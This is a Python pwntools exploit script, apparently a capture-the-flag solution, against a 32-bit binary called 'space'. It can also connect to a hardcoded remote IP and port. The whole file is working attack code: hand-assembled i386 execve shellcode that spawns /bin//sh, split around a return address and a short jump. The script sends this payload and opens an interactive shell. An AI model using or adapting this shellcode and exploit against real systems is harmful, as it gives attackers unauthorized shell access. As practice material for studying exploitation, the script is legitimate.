#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from binascii import hexlify

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './space'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("188.166.173.208",31822)
        return
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
entry-break
b main
b vuln
b _
b *0x0804919f
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

payload =  asm("push 0x6e69622f") #5
payload += asm("xchg ebx,esp")
payload += asm("xor ecx,ecx")
payload += asm("cdq")
payload += asm("""
mov al,0xb
int 0x80
""")
payload += asm("""
xor eax,eax
push eax
nop
""")
payload +=  p32(0x08049192)
payload += asm("push 0x68732f2f") 
payload += b"\xeb\x0a"

p.send(payload)
p.interactive()

